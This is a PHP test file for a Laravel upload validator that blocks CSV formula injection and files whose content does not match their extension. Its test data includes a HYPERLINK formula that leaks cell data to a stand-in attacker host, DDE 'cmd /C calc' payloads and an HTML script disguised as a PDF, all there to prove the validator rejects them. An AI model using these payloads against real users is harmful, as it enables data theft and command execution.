<?php

use App\Modules\Comisiones\Http\Support\CaptureFields;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Validator;
use OpenSpout\Common\Entity\Row;
use OpenSpout\Writer\XLSX\Writer;

/*
| The content of a capture support (S-32): it must be what its extension
| says, and a CSV cannot carry a formula that Excel would run when the
| approver opens it. Real files, since a fake upload has no content and
| reports the MIME type the test gives it.
*/

/** A real upload of these bytes, whose MIME type finfo reads. */
function supportUpload(string $name, string $content): UploadedFile
{
    $path = (string) tempnam(sys_get_temp_dir(), 'soporte');
    file_put_contents($path, $content);

    return new UploadedFile($path, $name, null, null, true);
}

/** A tiny image, as GD writes it. */
function supportImage(string $type): string
{
    ob_start();
    $type === 'png' ? imagepng(imagecreatetruecolor(2, 2)) : imagejpeg(imagecreatetruecolor(2, 2));

    return (string) ob_get_clean();
}

/** A one-sheet workbook, as OpenSpout writes it. */
function supportWorkbook(): UploadedFile
{
    $path = tempnam(sys_get_temp_dir(), 'soporte').'.xlsx';
    $writer = new Writer;
    $writer->openToFile($path);
    $writer->addRow(Row::fromValues(['Factura', 'Valor']));
    $writer->addRow(Row::fromValues(['FV-1', -5000]));
    $writer->close();

    return new UploadedFile($path, 'acta.xlsx', null, null, true);
}

/**
 * The errors of the support field; none when it passes.
 *
 * @return list<string>
 */
function supportErrors(UploadedFile $file): array
{
    return Validator::make(['soporte' => $file], ['soporte' => CaptureFields::support()])->errors()->get('soporte');
}

function formulaMessage(int $row, int $column): string
{
    return "El CSV tiene una fórmula en la fila {$row}, columna {$column}. Las celdas no pueden empezar por =, +, - o @, salvo los números.";
}

it('rejects a CSV with a formula cell, naming its row and column but not its content', function (string $content, int $row, int $column) {
    expect(supportErrors(supportUpload('detalle.csv', $content)))->toBe([formulaMessage($row, $column)]);
})->with([
    'HYPERLINK' => ["Factura;Detalle\nFV-1;=HYPERLINK(\"http://atacante/?x=\"&A1,\"ver\")\n", 2, 2],
    'DDE with +' => ["+cmd|' /C calc'!A0;Detalle\n", 1, 1],
    '@ function' => ["Factura;Valor;Detalle\nFV-1;100;@SUM(1+1)*cmd|' /C calc'!A0\n", 2, 3],
    'arithmetic with -' => ["Valor;Detalle\n-2+3;Pago\n", 2, 1],
    'after a space' => ["Factura;Detalle\nFV-1; =1\n", 2, 2],
    'after a tab and a line break inside quotes' => ["Factura;Detalle\nFV-1;\"\n\t=1\"\n", 2, 2],
    'only the first one' => ["Factura;Detalle\n=1;=2\n", 2, 1],
]);

it('accepts a CSV of text, empty cells and Colombian or plain numbers, even negative', function () {
    $content = "Factura;Valor;Nota;Saldo;Otro;Vacío;Decimal\n"
        ."FV-1;-5.000,50;Pago parcial;\$ -5.000;-5000;;-5.5\n"
        ."FV-2;+5000;Texto con = en medio;  -1.234;;x;0\n";

    expect(supportErrors(supportUpload('detalle.csv', $content)))->toBe([]);
});

it('reads a CSV with a BOM, so the BOM does not hide a formula in the first cell', function () {
    expect(supportErrors(supportUpload('detalle.csv', "\xEF\xBB\xBFFactura;Descripción\nFV-1;Ítem\n")))->toBe([])
        ->and(supportErrors(supportUpload('detalle.csv', "\xEF\xBB\xBF=1+1;Descripción\n")))->toBe([formulaMessage(1, 1)]);
});

it('reads a CSV in Windows-1252, as Excel in Spanish saves it', function () {
    expect(supportErrors(supportUpload('detalle.csv', "Factura;Descripci\xF3n\nFV-1;\xCDtem -5.000,50\n")))->toBe([])
        ->and(supportErrors(supportUpload('detalle.csv', "Factura;Descripci\xF3n\nFV-1;\xCDtem\nFV-2;-1+1\n")))->toBe([formulaMessage(3, 2)]);
});

it('counts a quoted multi-line cell as one row', function () {
    $content = "Factura;Detalle\n\"Nota\n=1 dentro del texto\";x\nFV-2;=1\n";

    expect(supportErrors(supportUpload('detalle.csv', $content)))->toBe([formulaMessage(3, 2)]);
});

it('detects a CSV separated by tabs or commas', function (string $content) {
    expect(supportErrors(supportUpload('detalle.csv', $content)))->toBe([formulaMessage(2, 2)]);
})->with([
    'tabs' => ["Factura\tDetalle\tValor\nFV-1\t@SUM(1)\t100\n"],
    'commas' => ["Factura,Detalle,Valor\nFV-1,=1,100\n"],
]);

it('rejects a support whose content is not what its extension says', function (string $name, string $content, string $type) {
    expect(supportErrors(supportUpload($name, $content)))->toBe(["El contenido del soporte no corresponde a un archivo {$type}."]);
})->with([
    'HTML renamed .pdf' => ['factura.pdf', '<!DOCTYPE html><html><body><script>alert(1)</script></body></html>', 'PDF'],
    'HTML renamed .csv' => ['detalle.csv', '<!DOCTYPE html><html><body><script>alert(1)</script></body></html>', 'CSV'],
    'text renamed .png' => ['captura.png', 'hola', 'PNG'],
    'PNG renamed .jpg' => ['foto.jpg', supportImage('png'), 'JPG'],
    'text renamed .xlsx' => ['acta.xlsx', 'hola', 'XLSX'],
]);

it('accepts real PDF, JPEG, PNG and XLSX files', function () {
    expect(supportErrors(supportUpload('factura.pdf', "%PDF-1.4\n1 0 obj<<>>endobj\ntrailer<<>>\n%%EOF\n")))->toBe([])
        ->and(supportErrors(supportUpload('foto.jpg', supportImage('jpeg'))))->toBe([])
        ->and(supportErrors(supportUpload('foto.jpeg', supportImage('jpeg'))))->toBe([])
        ->and(supportErrors(supportUpload('captura.png', supportImage('png'))))->toBe([])
        ->and(supportErrors(supportWorkbook()))->toBe([]);
});
